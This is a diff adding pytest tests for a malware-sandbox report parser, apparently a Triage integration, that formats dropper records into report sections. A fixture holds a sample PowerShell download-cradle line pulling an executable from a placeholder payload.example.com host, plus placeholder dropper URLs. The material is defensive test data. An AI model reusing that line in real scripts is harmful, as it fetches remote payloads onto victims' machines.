@@ -1,0 +1,148 @@
+"""Dropper, ransom-note and credential records from behavioral and overview reports."""
+
+import json
+import os
+from unittest.mock import MagicMock
+
+import pytest
+from conftest import SAMPLE_ID, build_report
+
+from triage_sandbox import service as service_module
+from triage_sandbox.evidence import clean_text, convert_extracted
+
+REPORT_URL = "https://api.tria.ge/v0/samples/{}/{}/report_triage.json"
+OVERVIEW_URL = f"https://api.tria.ge/v1/samples/{SAMPLE_ID}/overview.json"
+DROPPER = {
+    "language": "ps1",
+    "source": "powershell -enc AAAA",
+    "deobfuscated": "(New-Object Net.WebClient).DownloadFile('https://payload.example.com/a.exe')",
+    "urls": [
+        {"type": "exe.dropper", "url": "https://payload.example.com/a.exe"},
+        {"type": "exe.dropper", "url": "https://payload.example.com/a.exe"},
+        {"url": "http://198.51.100.7/b.exe"},
+    ],
+}
+
+
+def run(triage_service, make_request, api, extracted, overview=None):
+    """Execute the service with `extracted` on behavioral1 and return (request, task, sandbox sections)."""
+    report = build_report("behavioral1")
+    report["extracted"] = extracted
+    api.get(REPORT_URL.format(SAMPLE_ID, "behavioral1"), json=report)
+    other = build_report("behavioral2")
+    other["extracted"] = []
+    api.get(REPORT_URL.format(SAMPLE_ID, "behavioral2"), json=other)
+    api.get(OVERVIEW_URL, json=overview or {})
+    request = make_request()
+    triage_service.execute(request)
+    sandbox = request.result.sections[0]
+    task = next(s for s in sandbox.subsections if s.title_text.startswith("Task: behavioral1 "))
+    return request, task, sandbox
+
+
+def titled(section, title):
+    return next(s for s in section.subsections if s.title_text == title)
+
+
+def test_dropper_section_keeps_typed_urls_context_and_static_tags(triage_service, make_request, mock_triage_api):
+    item = {"dropper": DROPPER, "resource": "behavioral1/files/x.dat", "path": "C:\\x.ps1"}
+    request, task, _ = run(triage_service, make_request, mock_triage_api, [item])
+
+    section = titled(task, "Dropper (ps1)")
+    assert section.heuristic is None
+    assert "Path: C:\\x.ps1" in section.body
+    assert "Extraction resource: behavioral1/files/x.dat" in section.body
+    assert "Tasks: behavioral1" in section.body
+    urls = titled(section, "Dropper URLs")
+    assert json.loads(urls.body) == [
+        {"Type": "exe.dropper", "URL": "https://payload.example.com/a.exe"},
+        {"Type": "", "URL": "http://198.51.100.7/b.exe"},
+    ]
+    assert urls.heuristic is None
+    assert set(urls.tags["network.static.uri"]) == {
+        "https://payload.example.com/a.exe",
+        "http://198.51.100.7/b.exe",
+    }
+    assert urls.tags["network.static.domain"] == ["payload.example.com"]
+    assert urls.tags["network.static.ip"] == ["198.51.100.7"]
+    assert titled(section, "Dropper source").body == DROPPER["source"]
+    assert titled(section, "Deobfuscated dropper").body == DROPPER["deobfuscated"]
+    # Text is evidence, not an artifact: nothing is extracted or downloaded for it.
+    request.add_extracted.assert_not_called()
+    request.add_supplementary.assert_not_called()
+
+
+def test_dropper_repeated_in_task_appears_once_with_all_context(triage_service, make_request, mock_triage_api):
+    extracted = [{"dropper": DROPPER, "path": "C:\\a"}, {"dropper": DROPPER, "path": "C:\\b"}]
+    _, task, _ = run(triage_service, make_request, mock_triage_api, extracted)
+    assert sum(s.title_text == "Dropper (ps1)" for s in task.subsections) == 1
+    assert "Path: C:\\a, C:\\b" in titled(task, "Dropper (ps1)").body
+
+
+def test_long_dropper_text_is_bounded_with_one_supplementary_copy(triage_service, make_request, mock_triage_api):
+    long_text = "A" * (service_module.MAX_INLINE_TEXT + 10)
+    extracted = [
+        {"dropper": {"source": long_text, "language": "ps1"}},
+        {"dropper": {"source": long_text, "language": "hta"}},
+    ]
+    request, task, _ = run(triage_service, make_request, mock_triage_api, extracted)
+
+    body = titled(titled(task, "Dropper (ps1)"), "Dropper source").body
+    assert f"Showing the first {service_module.MAX_INLINE_TEXT} of {len(long_text)} characters." in body
+    assert "A" * (service_module.MAX_INLINE_TEXT + 1) not in body
+    assert "Complete text: supplementary file dropper_source_" in body
+    assert "Complete text" in titled(titled(task, "Dropper (hta)"), "Dropper source").body
+    request.add_supplementary.assert_called_once()
+    path, name, _description = request.add_supplementary.call_args.args
+    assert os.path.basename(path) == name
+    with open(path) as fh:
+        assert fh.read() == long_text
+
+
+def test_supplementary_failure_keeps_preview_and_reports_incomplete(triage_service, make_request, mock_triage_api):
+    long_text = "A" * (service_module.MAX_INLINE_TEXT + 1)
+    request = MagicMock()
+    request.add_supplementary.side_effect = OSError("disk full")
+    triage_service._supplementary_names = set()
+    section, diagnostic = triage_service._text_section(request, "Dropper source", long_text, "dropper_source")
+    assert "Showing the first" in section.body
+    assert "Complete text" not in section.body
+    assert diagnostic == "Dropper source: complete text could not be retained."
+
+
+def test_text_section_diagnostic_reaches_completeness(triage_service, make_request, mock_triage_api, monkeypatch):
+    monkeypatch.setattr(service_module, "MAX_INLINE_TEXT", 3)
+    report_item = {"dropper": {"source": "long source"}}
+    report = build_report("behavioral1")
+    report["extracted"] = [report_item]
+    mock_triage_api.get(REPORT_URL.format(SAMPLE_ID, "behavioral1"), json=report)
+    request = make_request()
+    request.add_supplementary.side_effect = OSError("disk full")
+    triage_service.execute(request)
+    completeness = titled(request.result.sections[0], "Analysis completeness")
+    assert "Dropper source: complete text could not be retained." in completeness.body
+
+
+@pytest.mark.parametrize(
+    "record",
+    [{"language": "ps1"}, {"urls": [{"type": "exe.dropper"}, "bad"]}, {"urls": "bad", "source": 7}],
+)
+def test_dropper_without_evidence_is_skipped(record):
+    assert convert_extracted({"dropper": record}, "Task t") == ([], [])
+
+
+def test_convert_extracted_reports_invalid_dropper_and_ignores_non_records():
+    assert convert_extracted({"dropper": "bad"}, "Task t") == ([], ["Task t: invalid dropper record."])
+    assert convert_extracted("bad", "Task t") == ([], [])
+
+
+def test_dropper_without_language_or_urls(triage_service, make_request, mock_triage_api):
+    _, task, _ = run(triage_service, make_request, mock_triage_api, [{"dropper": {"source": "cmd /c x\x00"}}])
+    section = titled(task, "Dropper")
+    assert [s.title_text for s in section.subsections] == ["Dropper source"]
+    assert section.subsections[0].body == "cmd /c x"
+
+
+def test_clean_text_rejects_non_text_and_blank_values():
+    assert clean_text(None) is None
+    assert clean_text(" \x00 ") is None
